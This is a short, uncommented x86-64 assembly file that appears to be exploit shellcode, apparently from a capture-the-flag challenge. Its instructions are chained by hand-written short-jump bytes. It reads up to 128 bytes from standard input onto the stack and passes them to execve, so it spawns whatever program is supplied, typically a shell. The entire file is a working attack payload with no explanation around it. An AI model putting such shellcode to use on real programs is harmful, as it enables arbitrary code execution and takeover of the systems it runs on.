bits 64
global    _start

section   .text
_start:

push rsp
pop rsi
xor edi, edi
nop
nop
db 0xeb, 0xb-2

mov edx, 0x80
nop
db 0xeb, 8-2

xor eax, eax
syscall
nop
nop
db 0xeb, 8-2

mov eax, dword 0x3b
nop
db 0xeb, 8-2

push rsp
pop rdi
xor esi, esi
xor edx, edx
db 0xeb, 8-2

syscall
db 0xeb, 0xfe
nop
nop
nop
nop

